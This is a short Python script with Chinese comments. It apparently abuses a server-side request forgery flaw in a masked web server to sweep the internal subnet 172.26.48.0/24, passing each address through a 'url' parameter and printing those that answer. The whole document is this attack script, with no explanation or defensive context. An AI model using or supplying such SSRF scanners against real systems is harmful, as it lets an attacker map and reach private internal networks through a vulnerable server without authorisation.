import requests#激活模板
for i in range(1,256):
    ip = f"172.26.48.{i}"
    url = f"http://***.***.***.***?url=http://{ip}"
    try:
        requests.get(url,timeout=2)#设置检测参数和超时时间
        print(ip)
    except:
        pass